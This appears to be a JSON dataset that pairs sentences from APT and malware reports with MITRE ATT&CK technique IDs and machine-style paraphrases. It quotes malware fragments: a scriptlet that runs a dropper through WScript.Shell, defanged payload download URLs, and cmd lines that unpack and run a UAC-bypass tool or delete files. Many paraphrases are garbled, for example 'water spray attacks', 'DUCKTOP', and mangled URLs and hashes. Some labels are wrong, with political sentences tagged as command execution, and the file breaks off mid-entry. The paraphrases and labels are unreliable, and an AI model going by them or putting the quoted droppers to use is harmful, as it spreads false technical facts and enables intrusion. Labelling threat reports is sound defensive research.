{
    "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS": [
        {
            "tec_id": "T1189",
            "en_text": "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS",
            "data_text": "Through these reports, the group uses a variety of tools and strategies, including zero-day attacks on common applications such as Java or Microsoft Office, window phishing attacks, legitimate website corruption for water spray attacks, and multiple operating systems (Windows, OSX, Li).nux, even mobile iOS"
        }
    ],
    "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2": [
        {
            "tec_id": "T1027",
            "en_text": "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2",
            "data_text": "Specifically, the following GitHub repository appears to be controlled by mudi water threat actors. [unknown SHA256] Payload Download Location: hxxps://raw.githubuser content [.com/F0R3X/BrowserFont/master/ArabicBrowserFont.exe [unknown SHA256] Download Location: hxps://raw.gubuser content [exe.brow/Brow].Download the payload from guserBlab3X3X3X3409349359359309353xps: hxxps://raw.githubuser content [.com/ReactDeveloper2017/react/master/src/test/test.js]. Interestingly, both profiles were populated with branched repositories to provide an atmosphere of legitimacy, as shown in Figure 2."
        }
    ],
    "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF": [
        {
            "tec_id": "T1189",
            "en_text": "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF",
            "data_text": "What does the resulting pool look like? The website is corrupted to redirect visitors to ScanBox and BEeF instances."
        }
    ],
    "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims": [
        {
            "tec_id": "T1189",
            "en_text": "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims",
            "data_text": "[2] Threat groups use strategic web compromises (SWCs), also known as waterhole attacks, to target a wide range of potential victims."
        }
    ],
    "We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks": [
        {
            "tec_id": "T1189",
            "en_text": "We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks",
            "data_text": "For example, we believe that this connection was abused by inserting malicious scripts into the country's official website to carry out a watering can attack."
        }
    ],
    "<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\\Users\\%username%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe": [],
    "The Trojan will save the output of the command to %TEMP%\\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful": [
        {
            "tec_id": "T1059",
            "en_text": "The Trojan will save the output of the command to %TEMP%\\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful",
            "data_text": "The Trojan saves the output of the command as %TEMP%\\win<random number>.txt fails to send content to the C2 server or execute the command \"The length of Cmd result file is ziro!\""
        }
    ],
    "This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7": [
        {
            "tec_id": "T1189",
            "en_text": "This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7",
            "data_text": "Attacking additional targets against third-party organizations is a dangerous move from the attacker's point of view. This is because the attacker's activities within the organization may be exposed to new targets (organizations that receive malicious documents). Understanding the Meaning of Mudflood When we looked at what-composed activity clusters, it seemed to be a spy-centric attack in the Middle East, but we were somewhat confused because previous public reports determined that these attacks were attributed to FIN7."
        }
    ],
    "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks": [
        {
            "tec_id": "T1189",
            "en_text": "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks",
            "data_text": "Online news media and general websites have been hacked and weaponized as a means of attacking pools of water."
        }
    ],
    "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets": [
        {
            "tec_id": "T1189",
            "en_text": "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets",
            "data_text": "Malicious factors used watering hole attacks to compromise legitimate and trusted websites frequently visited by targets."
        }
    ],
    "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks": [
        {
            "tec_id": "T1189",
            "en_text": "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks",
            "data_text": "The payload delivered in an attack using DDE support documents in November 2017 was the SoFacey Carbuff, which is different from the Zebrocy downloaders delivered in February 2018."
        }
    ],
    "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information": [
        {
            "tec_id": "T1189",
            "en_text": "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information",
            "data_text": "Like many threat groups, the TG-3390 makes strategic web compromises (SWCs) on websites related to vertical or demographics of the target organization to increase the likelihood of finding victims with relevant information."
        }
    ],
    "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)": [
        {
            "tec_id": "T1189",
            "en_text": "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)",
            "data_text": "Threat actors compromise websites used in target demographics (e.g., damage to websites specializing in oil and gas industry news when targeting energy industries)."
        }
    ],
    "This is followed by a number of Linux shell command style commands related to the malware establishing persistence": [
        {
            "tec_id": "T1059",
            "en_text": "This is followed by a number of Linux shell command style commands related to the malware establishing persistence",
            "data_text": "This is followed by numerous Linux shell command style commands related to malware that establish persistence."
        }
    ],
    "The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell": [
        {
            "tec_id": "T1059",
            "en_text": "The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell",
            "data_text": "Features of malware include system investigation, file system access, command execution, and reverse shell."
        }
    ],
    "This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process": [
        {
            "tec_id": "T1059",
            "en_text": "This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process",
            "data_text": "This indicates that the human operator executed the command from the command-line style interface rather than an automated GUI process."
        }
    ],
    "Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement": [
        {
            "tec_id": "T1059",
            "en_text": "Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement",
            "data_text": "DUCKTOP is primarily a command-line reconnaissance tool, but it can also be used for lateral movement."
        }
    ],
    "The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders": [
        {
            "tec_id": "T1059",
            "en_text": "The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders",
            "data_text": "Most of the ActiveX objects created by Wscript.Shells and shells.Applications are used to run programs, create shortcuts, manipulate registry contents, or access system folders."
        }
    ],
    "Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline": [
        {
            "tec_id": "T1059",
            "en_text": "Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline",
            "data_text": "During the above observation described, the command was 'router-PC'CnC. We went to the server and went offline before the config file where we passed the next command after tracking."
        }
    ],
    "After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line": [
        {
            "tec_id": "T1059",
            "en_text": "After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line",
            "data_text": "After decryption, these 34 commands are plain text with space-separated parameters, such as command lines."
        }
    ],
    "The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters": [
        {
            "tec_id": "T1059",
            "en_text": "The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters",
            "data_text": "Command and parameter names are hash before they are compared in binary, making it difficult to recover the original names of commands and parameters."
        }
    ],
    "These commands are also executed when the loadconfig command is issued": [
        {
            "tec_id": "T1059",
            "en_text": "These commands are also executed when the loadconfig command is issued",
            "data_text": "These commands are also executed when the loadconfig command is executed."
        }
    ],
    "The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it": [
        {
            "tec_id": "T1059",
            "en_text": "The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it",
            "data_text": "The loadconfig and state commands run during initialization, and if there is no configuration file, they effectively create the configuration file and write the state command to the file."
        }
    ],
    "The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4": [
        {
            "tec_id": "T1059",
            "en_text": "The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4",
            "data_text": "The Commands tab displays the commands that were previously executed, when they were executed, and their status (see Figure 4)."
        }
    ],
    "Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”": [
        {
            "tec_id": "T1059",
            "en_text": "Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”",
            "data_text": "Agent Control Panel in Elive, which shows the interface that the operator will use to send commands, click the command to view the results in a pop-up window called \"Results Viewer.\""
        }
    ],
    "Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output",
            "data_text": "Figure 7 shows how similar these two batch scripts are when several headers are exactly the same and most commands are the same as Helminth commands in 2>."
        }
    ],
    "This script relays commands and output between the controller and the system": [
        {
            "tec_id": "T1059",
            "en_text": "This script relays commands and output between the controller and the system",
            "data_text": "The script relays commands and outputs between the controller and the system."
        }
    ],
    "The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)": [
        {
            "tec_id": "T1059",
            "en_text": "The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)",
            "data_text": "The threat actor unlocked and disabled the server's default logging component (system) using the appcmd command line tool.Select webServer/httpslogging) and then delete the existing logs from the system (see Figure 4)."
        }
    ],
    "RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool": [
        {
            "tec_id": "T1059",
            "en_text": "RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool",
            "data_text": "RemoteCMD: This tool executes commands from a remote computer similar to the PsExec tool."
        }
    ],
    "These are in-line with the targeting of the victims witnessed by the attackers using Conmie": [
        {
            "tec_id": "T1059",
            "en_text": "These are in-line with the targeting of the victims witnessed by the attackers using Conmie",
            "data_text": "This is consistent with the targets of the victims that the attackers witnessed using Conmy"
        }
    ],
    "Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan": [
        {
            "tec_id": "T1059",
            "en_text": "Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan",
            "data_text": "The intrusions and campaigns carried out by this group are in line with the goals and self-interest of the People's Republic of China for Taiwan."
        }
    ],
    "Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands": [
        {
            "tec_id": "T1059",
            "en_text": "Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands",
            "data_text": "Run arbitrary command using network address and operating system version acquisition \"cmd.exe/c\" Run system command function"
        }
    ],
    "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell",
            "data_text": "Figure 3: ALFA TeamM Shell v2-Fake Mail (default) Figure 4 shows an example email containing default values for the shell."
        }
    ],
    "Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands": [
        {
            "tec_id": "T1059",
            "en_text": "Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands",
            "data_text": "Remexi is the default backdoor Trojan that allows an attacker to open a remote shell on a computer and execute commands."
        }
    ],
    "Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker": [
        {
            "tec_id": "T1059",
            "en_text": "Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker",
            "data_text": "Although not sophisticated, remote shells provide highly flexible and powerful remote access to the hands of experienced attackers."
        }
    ],
    "!CMD  Trojan executes a command prompt command": [
        {
            "tec_id": "T1059",
            "en_text": "!CMD  Trojan executes a command prompt command",
            "data_text": "!CMD Trojan executes a command prompt command."
        }
    ],
    "Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files": [
        {
            "tec_id": "T1059",
            "en_text": "Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files",
            "data_text": "If you do not want to continue copying and running Trojans using the \"tmp.vbs\" and \"tmp1.vbs\" files, both variants must be run with the command-line argument \"[2]\"."
        }
    ],
    "The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini": [
        {
            "tec_id": "T1059",
            "en_text": "The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini",
            "data_text": "The Visual Basic macro uses the following command line: The control server credentials contained in the cmd /cexpand%TEMP%\\setup.cab -F:*%TEMP% &&cd/d%TEMP% &&del /f /q setup.cab &uacme.exe CAB file are different. Decoded credential data contained in another IPnet.You"
        }
    ],
    "/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer": [
        {
            "tec_id": "T1059",
            "en_text": "/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer",
            "data_text": "/user <parameter>: Runs the downloaded file with the specified parameter using CreateProcessAsUser cmd /c <command>. The actor behind the Command Execution Conclusion Honeybee on an infected endpoint has been operating with a new implant using the first known version of NTWDB since at least November 2017.LIB installer"
        }
    ],
    "Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C": [
        {
            "tec_id": "T1059",
            "en_text": "Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C",
            "data_text": "Remote Shell: The above function is visible in many binaries of the Mirage family and runs when a command is sent from C."
        }
    ],
    "It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)": [
        {
            "tec_id": "T1059",
            "en_text": "It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)",
            "data_text": "Run the command in cmd.exe (later shown at the bottom of the function, not shown in the screenshot, locate cmd.exe and run it using the Create Process).A)A)A)"
        }
    ],
    "This ID is sent to the CnC with each request for commands to execute": [
        {
            "tec_id": "T1059",
            "en_text": "This ID is sent to the CnC with each request for commands to execute",
            "data_text": "This ID is sent to CnC with each request for the command to be executed."
        }
    ],
    "Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“": [
        {
            "tec_id": "T1059",
            "en_text": "Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“",
            "data_text": "Supported Commands \"Upload\", \"Screenshot\", \"Excel\", \"Outlook\", \"Risk\", \"Reboot\", \"Shutdown\", \"Cure\""
        }
    ],
    "Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30": [
        {
            "tec_id": "T1059",
            "en_text": "Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30",
            "data_text": "Both create one thread, each of which is responsible for downloading and running files or running command-line programs from the terminal. Figure 28. Commands used to download and run terminals and execute commands Figure 29. Commands used to upload and download files Figure 30"
        }
    ],
    "Traps provides endpoint protection, as it can block Excel from creating a command prompt process": [
        {
            "tec_id": "T1059",
            "en_text": "Traps provides endpoint protection, as it can block Excel from creating a command prompt process",
            "data_text": "Traps provide endpoint protection because they can block Excel from creating a command prompt process."
        }
    ],
    "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands": [
        {
            "tec_id": "T1059",
            "en_text": "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands",
            "data_text": "For example, this Trojan uses an Internet Explorer application object that is very similar to the previous Ops.Command acquisition request order very similar to IE Trojan horse"
        }
    ],
    "cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin": [
        {
            "tec_id": "T1059",
            "en_text": "cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin",
            "data_text": "After cmd.exe /Cchoice /CY /N /DY /T2 & Del sleep mode, Trojan creates a GUID and writes it to %APPDA.TA%\\Windows\\GDI.bin."
        }
    ],
    "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments": [
        {
            "tec_id": "T1059",
            "en_text": "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments",
            "data_text": "Otherwise, the Trojan tries to parse the response to the command, especially by splitting the decode response in <> and treating the text to the left of the <> string as a command argument."
        }
    ],
    "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs": [
        {
            "tec_id": "T1059",
            "en_text": "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs",
            "data_text": "The run command (1) creates a cmd.exe /c process with the command parameters added and writes the output of the command to the %APPDA file in hexadecimal format.TA%\\tmpCa.vbs"
        }
    ],
    "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests": [
        {
            "tec_id": "T1059",
            "en_text": "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests",
            "data_text": "Malware essentially provides an attacker with a remote CMD/PowerShell terminal that allows them to execute all scripts/commands and receive results through HTTP requests."
        }
    ],
    "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests": [
        {
            "tec_id": "T1059",
            "en_text": "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests",
            "data_text": "Malware by default provides an attacker with a remote CMD/PowerShell terminal, allowing them to execute scripts/commands and receive results through HTTP requests."
        }
    ],
    "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS": [
        {
            "tec_id": "T1059",
            "en_text": "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS",
            "data_text": "C2 communications have also been updated in previous versions, and the following commands are now supported by BADNEWS: Command Description 0 Kill BADNEWS"
        }
    ],
    "Access remote objects interactively from the pupy shell and get auto-completion of remote attributes": [
        {
            "tec_id": "T1059",
            "en_text": "Access remote objects interactively from the pupy shell and get auto-completion of remote attributes",
            "data_text": "Automatically completes remote properties by interactively accessing remote objects from the Puppy shell"
        }
    ],
    "Execute noninteractive commands on multiple hosts at once": [
        {
            "tec_id": "T1059",
            "en_text": "Execute noninteractive commands on multiple hosts at once",
            "data_text": "Run non-interactive commands on multiple hosts at once"
        }
    ],
    "Open interactive python shells with auto-completion on the all-in-memory remote python interpreter": [
        {
            "tec_id": "T1059",
            "en_text": "Open interactive python shells with auto-completion on the all-in-memory remote python interpreter",
            "data_text": "Open Interactive Python Shell with AutoComplete in All-in-Memory Remote Python Interpreter"
        }
    ],
    "Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely": [
        {
            "tec_id": "T1059",
            "en_text": "Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely",
            "data_text": "You can open an interactive shell (cmd.exe, /bin/bash, etc.) remotely."
        }
    ],
    "Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell": [
        {
            "tec_id": "T1059",
            "en_text": "Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell",
            "data_text": "Remote Shell on Unix"
        }
    ],
    "Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor",
            "data_text": "Figure 1: SpeechUp's Victim Distribution Figure 2: SpeechUp's Daily Propagation Rate Infection Vector Initial Infection Vector targets a recently reported vulnerability in ThinkPHP and uses instruction injection techniques to upload PHP shells that provide and run Perl backdoor."
        }
    ],
    "Figure 6: SpeakUp receives additional commands to execute, this time in plain text": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 6: SpeakUp receives additional commands to execute, this time in plain text",
            "data_text": "Figure 6: SpeakUp receives additional commands to execute. This time, it's plain text."
        }
    ],
    "Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device": [
        {
            "tec_id": "T1059",
            "en_text": "Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device",
            "data_text": "Command execution If the malware developer decides to run a command on the victim's device, it can cause significant damage to the victim."
        }
    ],
    "BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration": [
        {
            "tec_id": "T1059",
            "en_text": "BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration",
            "data_text": "BADFLICK: Backdoor to modify file system, create reverse shell, and modify command and control (C2) configuration"
        }
    ],
    "MURKYTOP: a command-line reconnaissance tool": [
        {
            "tec_id": "T1059",
            "en_text": "MURKYTOP: a command-line reconnaissance tool",
            "data_text": "DUCKTOP: Command Line Reconnaissance Tool"
        }
    ],
    "The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands": [
        {
            "tec_id": "T1059",
            "en_text": "The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands",
            "data_text": "Malware supports several functions, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands."
        }
    ],
    "The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018": [
        {
            "tec_id": "T1059",
            "en_text": "The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018",
            "data_text": "The summit is the latest in North Korea's diplomatic outings following the Panmunjom Declaration on April 27, 2018 for the peaceful, prosperous reunification of the two Koreas."
        }
    ],
    "It is used to create new processes, perform as a command line shell, and several other tasks": [
        {
            "tec_id": "T1059",
            "en_text": "It is used to create new processes, perform as a command line shell, and several other tasks",
            "data_text": "Used to create new processes, perform command-line shells, and many other tasks."
        }
    ],
    "The starred commands are undocumented commands": [
        {
            "tec_id": "T1059",
            "en_text": "The starred commands are undocumented commands",
            "data_text": "Commands marked with an asterisk are undocumented commands."
        }
    ],
    "Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell": [
        {
            "tec_id": "T1059",
            "en_text": "Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell",
            "data_text": "Security threat actors exist on compromised systems, so you can run a variety of commands, including uploading and downloading files, and scattering reverse shells."
        }
    ],
    "UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe": [
        {
            "tec_id": "T1059",
            "en_text": "UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe",
            "data_text": "UserInstall.exe uses the BITSadmin command-line tool to create jobs and run the sidebar.carry out"
        }
    ],
    "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system": [
        {
            "tec_id": "T1059",
            "en_text": "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system",
            "data_text": "This parameter sends the agent_id to the C2 server to get the command that the operator wants to run on a compromised system."
        }
    ],
    "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1": [
        {
            "tec_id": "T1059",
            "en_text": "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1",
            "data_text": "We analyzed the command handlers and found that they provide the necessary commands for fully functioning backdoors, as shown in Table 1."
        }
    ],
    "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities",
            "data_text": "Figure 2: Leakage via Softy Fysbis function-related string Figure 2 shows an interactive status/feedback string that can provide the defender with an initial profile of the function."
        }
    ],
    "For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples": [
        {
            "tec_id": "T1027",
            "en_text": "For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples",
            "data_text": "For comparison, if you examine one of the variants removed for the Fysbis \"RemoteShell\" related string, you can only see the following: Figure 3: Remove Softy Fysbis for RemoteShell features Reference Binary Strings Compare to Strapless variants: Figure 4: Static analytical gifts such as Softy Fysbis non-strip binary strings referencing RemoteShell features can help speed up the Defender's feature enumeration, and more importantly contribute to correlation and detection among related samples."
        }
    ],
    "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload": [
        {
            "tec_id": "T1027",
            "en_text": "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload",
